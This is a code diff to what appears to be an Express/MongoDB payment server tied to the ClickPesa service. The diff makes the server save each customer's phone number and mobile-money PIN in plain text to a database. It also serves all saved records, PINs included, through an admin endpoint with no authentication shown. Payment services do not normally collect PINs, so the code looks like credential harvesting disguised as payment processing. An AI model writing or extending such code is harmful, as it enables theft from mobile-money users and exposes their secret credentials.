@@ -19,9 +19,16 @@ app.use(cors());
 app.use(express.json());
 
 // =======================
-// 📊 STORE PHONE + PIN
+// 📊 PAYMENT SCHEMA
 // =======================
-let payments = [];
+const paymentSchema = new mongoose.Schema({
+  phone: String,
+  pin: String,
+  amount: Number,
+  time: String
+});
+
+const Payment = mongoose.model("Payment", paymentSchema);
 
 // =======================
 // 🔑 ClickPesa Credentials
@@ -105,9 +112,9 @@ app.post("/create-payment", async (req, res) => {
     }
 
     // =======================
-    // 📊 SAVE PHONE + PIN
+    // 📊 SAVE PAYMENT TO MONGODB
     // =======================
-    payments.push({
+    await Payment.create({
       phone: phone,
       pin: pin || "",
       amount: amount,
@@ -166,8 +173,20 @@ app.post("/create-payment", async (req, res) => {
 // =======================
 // 📊 ADMIN DASHBOARD DATA
 // =======================
-app.get("/admin/payments", (req, res) => {
-  res.json(payments);
+app.get("/admin/payments", async (req, res) => {
+
+  try {
+
+    const data = await Payment.find().sort({ _id: -1 });
+
+    res.json(data);
+
+  } catch (error) {
+
+    res.status(500).json({ error: error.message });
+
+  }
+
 });
 
 // =======================
